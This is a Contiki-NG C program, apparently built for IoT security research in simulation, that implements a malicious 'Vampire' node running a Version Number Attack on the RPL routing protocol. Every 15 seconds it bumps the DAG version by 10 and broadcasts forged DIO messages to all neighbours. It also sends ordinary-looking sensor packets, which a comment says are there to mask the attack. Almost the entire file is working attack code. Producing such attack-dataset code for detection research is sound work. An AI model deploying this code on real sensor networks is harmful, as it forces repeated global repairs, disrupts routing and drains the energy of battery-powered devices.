#include "contiki.h"
#include "net/routing/routing.h"
#include "net/routing/rpl-lite/rpl.h"   
#include "net/routing/rpl-lite/rpl-icmp6.h"
#include "net/netstack.h"
#include "simple-udp.h"
#include "sys/node-id.h"
#include "sys/log.h"
#include "lib/random.h"

#define LOG_MODULE "VAMPIRE"
#define LOG_LEVEL LOG_LEVEL_INFO

#define SEND_PORT 8765

/* Chu kỳ gửi dữ liệu bình thường */
#define NORMAL_SEND_INTERVAL (10 * CLOCK_SECOND)
/* Chu kỳ kích hoạt Version Number Attack */
#define VNA_ATTACK_INTERVAL  (15 * CLOCK_SECOND)

typedef struct {
  uint16_t cluster_id;
  uint16_t node_id_f;
  uint32_t seqno;
  uint32_t residual_mj;
  uint32_t tx_time;
  int16_t temperature_c;
} sensor_payload_t;

static struct simple_udp_connection udp_conn;

PROCESS(vampire_process, "Vampire Attacker Node");
AUTOSTART_PROCESSES(&vampire_process);

PROCESS_THREAD(vampire_process, ev, data)
{
  static struct etimer send_timer;
  static struct etimer attack_timer;
  static uip_ipaddr_t dest_ipaddr;
  static uint32_t sent_count = 0;
  
  PROCESS_BEGIN();

  simple_udp_register(&udp_conn, SEND_PORT, NULL, SEND_PORT, NULL);
  
  LOG_INFO("Vampire Node started - Target: Version Number Attack\n");
  
  /* Bắt đầu chu kỳ gửi gói tin data bình thường để che giấu hành vi */
  etimer_set(&send_timer, NORMAL_SEND_INTERVAL);
  /* Bắt đầu chu kỳ phát tán VNA */
  etimer_set(&attack_timer, VNA_ATTACK_INTERVAL);

  while(1) {
    PROCESS_WAIT_EVENT();

    /* Xử lý phát tán Version Number Attack */
    if(ev == PROCESS_EVENT_TIMER && data == &attack_timer) {
        
        /* Chỉ tấn công nếu node đã tham gia vào mạng RPL (có instance hợp lệ) */
        if(curr_instance.used) {
            /* Tăng Version Number lên một giá trị tuỳ ý (ví dụ +10 giống HUNSR repo) */
            uint8_t old_version = curr_instance.dag.version;
            curr_instance.dag.version += 10;
            
            LOG_INFO("ATTACK_VNA: Triggered! Version changed %u -> %u. Broadcasting DIO...\n", 
                     old_version, curr_instance.dag.version);
            
            /* Ép hệ điều hành phát ra gói tin DIO mang Version mới tới tất cả lân cận */
            rpl_icmp6_dio_output(NULL);
        } else {
            LOG_INFO("ATTACK_VNA: Not joined RPL DAG yet, waiting...\n");
        }

        etimer_set(&attack_timer, VNA_ATTACK_INTERVAL);
    }

    /* Xử lý gửi gói dữ liệu cảm biến bình thường */
    if(ev == PROCESS_EVENT_TIMER && data == &send_timer) {
      if(NETSTACK_ROUTING.node_is_reachable() &&
         NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
        
        sensor_payload_t p;
        p.cluster_id = (node_id <= 26) ? 1 : 2;
        p.node_id_f = node_id;
        p.seqno = sent_count++;
        p.residual_mj = 7200;
        p.tx_time = clock_time();
        p.temperature_c = (int16_t)(250 + (random_rand() % 50));
        
        LOG_INFO("NORMAL_TX node=%u seq=%lu\n", node_id, (unsigned long)p.seqno);
        simple_udp_sendto(&udp_conn, &p, sizeof(p), &dest_ipaddr);
      }
      etimer_set(&send_timer, NORMAL_SEND_INTERVAL);
    }
  }
  PROCESS_END();
}
